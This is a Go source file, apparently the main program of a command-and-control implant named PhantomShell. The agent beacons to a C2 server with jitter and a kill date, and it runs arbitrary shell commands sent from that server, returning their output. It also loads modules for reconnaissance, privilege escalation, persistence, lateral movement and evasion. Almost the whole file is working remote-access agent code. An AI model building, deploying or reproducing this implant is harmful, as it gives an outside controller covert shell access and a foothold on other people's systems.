package main

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	pscrypto "github.com/OmonovSarvar/PhantomShell/agents/go/crypto"
	"github.com/OmonovSarvar/PhantomShell/agents/go/core"
	"github.com/OmonovSarvar/PhantomShell/agents/go/modules"
	"github.com/OmonovSarvar/PhantomShell/agents/go/transport"
)

const version = "5.2"

func main() {
	host := flag.String("host", "0.0.0.0", "C2 server host")
	port := flag.Int("port", 4444, "C2 server port")
	sleep := flag.Int("sleep", 5, "Beacon interval in seconds")
	jitter := flag.Float64("jitter", 0.2, "Jitter factor (0.0-1.0)")
	killDate := flag.String("kill-date", "", "Kill date (YYYY-MM-DD)")
	noEncrypt := flag.Bool("no-encrypt", false, "Disable AES encryption")
	proto := flag.String("transport", "tcp", "Transport protocol (tcp|http)")
	flag.Parse()

	agentID := generateAgentID()
	psk := os.Getenv("PS_AUTH_KEY")
	if psk == "" {
		psk = "phantomshell-default-key"
	}

	// Initialize transport
	var t transport.Transport
	switch *proto {
	case "http":
		t = transport.NewHTTPTransport(*host, *port, false, true)
	default:
		t = transport.NewTCPTransport(*host, *port)
	}

	// Initialize encryption key
	var encKey []byte
	if !*noEncrypt {
		var err error
		encKey, err = pscrypto.GenerateKey()
		if err != nil {
			log.Fatalf("generate key: %v", err)
		}
	}

	// Initialize executor and dispatcher
	exec := core.NewExecutor()
	dispatcher := core.NewDispatcher()

	// Register shell command handler
	dispatcher.Register("shell", func(args map[string]interface{}) map[string]interface{} {
		cmd := ""
		if c, ok := args["command"]; ok {
			if s, ok := c.(string); ok {
				cmd = s
			}
		}
		timeout := time.Duration(0)
		if t, ok := args["timeout"]; ok {
			if f, ok := t.(float64); ok {
				timeout = time.Duration(f) * time.Second
			}
		}
		stdout, stderr, code := exec.Run(cmd, timeout)
		return map[string]interface{}{
			"stdout":    stdout,
			"stderr":    stderr,
			"exit_code": code,
		}
	})

	dispatcher.Register("cd", func(args map[string]interface{}) map[string]interface{} {
		dir := ""
		if d, ok := args["path"]; ok {
			if s, ok := d.(string); ok {
				dir = s
			}
		}
		exec.SetCwd(dir)
		return map[string]interface{}{"cwd": dir}
	})

	// Register all modules
	modules.RegisterRecon(dispatcher, exec)
	modules.RegisterFileOps(dispatcher)
	modules.RegisterScanner(dispatcher)
	modules.RegisterPrivesc(dispatcher, exec)
	modules.RegisterPersist(dispatcher, exec)
	modules.RegisterLateral(dispatcher, exec)
	modules.RegisterEvasion(dispatcher, exec)

	// Scheduler
	sched := core.NewScheduler(
		time.Duration(*sleep)*time.Second,
		*jitter,
		*killDate,
	)

	// Graceful shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	done := make(chan struct{})

	go func() {
		<-sigCh
		close(done)
	}()

	// Main agent loop
	seq := 0
	for {
		select {
		case <-done:
			t.Disconnect()
			return
		default:
		}

		if err := t.Connect(); err != nil {
			if !sched.Wait() {
				return
			}
			continue
		}

		// Register with HMAC auth
		authMAC := computeHMAC(psk, agentID)
		regMsg := buildMessage(agentID, "register", seq, map[string]interface{}{
			"version":  version,
			"auth":     authMAC,
			"commands": dispatcher.Commands(),
		})
		seq++

		if err := sendMessage(t, regMsg, encKey, *noEncrypt); err != nil {
			t.Disconnect()
			if !sched.Wait() {
				return
			}
			continue
		}

		// Read registration ack
		if _, err := recvMessage(t, encKey, *noEncrypt); err != nil {
			t.Disconnect()
			if !sched.Wait() {
				return
			}
			continue
		}

		// Set session ID for HTTP transport
		if ht, ok := t.(*transport.HTTPTransport); ok {
			ht.SetSessionID(agentID)
		}

		// Beacon/task loop
		for t.Connected() {
			select {
			case <-done:
				t.Disconnect()
				return
			default:
			}

			if !sched.Wait() {
				t.Disconnect()
				return
			}

			// Send beacon
			beacon := buildMessage(agentID, "beacon", seq, nil)
			seq++
			if err := sendMessage(t, beacon, encKey, *noEncrypt); err != nil {
				break
			}

			// Receive task
			taskData, err := recvMessage(t, encKey, *noEncrypt)
			if err != nil {
				break
			}
			if taskData == nil {
				continue // no task
			}

			var taskMsg map[string]interface{}
			if err := json.Unmarshal(taskData, &taskMsg); err != nil {
				continue
			}

			// Extract and dispatch command
			payload, _ := taskMsg["payload"].(map[string]interface{})
			if payload == nil {
				continue
			}
			command, _ := payload["command"].(string)
			cmdArgs, _ := payload["args"].(map[string]interface{})
			if command == "" {
				continue
			}

			// Handle config updates from C2
			if command == "config" {
				if s, ok := cmdArgs["sleep"].(float64); ok {
					if j, ok := cmdArgs["jitter"].(float64); ok {
						sched.UpdateConfig(time.Duration(s)*time.Second, j)
					}
				}
				continue
			}
			if command == "kill" {
				sched.Kill()
				t.Disconnect()
				return
			}

			result := dispatcher.Dispatch(command, cmdArgs)
			resp := buildMessage(agentID, "response", seq, map[string]interface{}{
				"task_id": taskMsg["message_id"],
				"command": command,
				"result":  result,
			})
			seq++
			if err := sendMessage(t, resp, encKey, *noEncrypt); err != nil {
				break
			}
		}
	}
}

func generateAgentID() string {
	b := make([]byte, 6)
	rand.Read(b)
	return fmt.Sprintf("ps-%s", hex.EncodeToString(b))
}

func computeHMAC(psk, agentID string) string {
	mac := hmac.New(sha256.New, []byte(psk))
	mac.Write([]byte(agentID))
	return hex.EncodeToString(mac.Sum(nil))
}

func buildMessage(agentID, msgType string, seq int, payload map[string]interface{}) []byte {
	msg := map[string]interface{}{
		"message_id": generateMsgID(),
		"timestamp":  time.Now().Unix(),
		"sequence":   seq,
		"agent_id":   agentID,
		"type":       msgType,
		"payload":    payload,
	}
	data, _ := json.Marshal(msg)
	return data
}

func generateMsgID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

func sendMessage(t transport.Transport, data, encKey []byte, noEncrypt bool) error {
	if !noEncrypt && encKey != nil {
		encrypted, err := pscrypto.Encrypt(encKey, data)
		if err != nil {
			return fmt.Errorf("encrypt: %w", err)
		}
		data = encrypted
	}
	return t.Send(data)
}

func recvMessage(t transport.Transport, encKey []byte, noEncrypt bool) ([]byte, error) {
	data, err := t.Recv()
	if err != nil {
		return nil, err
	}
	if data == nil {
		return nil, nil
	}
	if !noEncrypt && encKey != nil {
		decrypted, err := pscrypto.Decrypt(encKey, data)
		if err != nil {
			return nil, fmt.Errorf("decrypt: %w", err)
		}
		data = decrypted
	}
	return data, nil
}
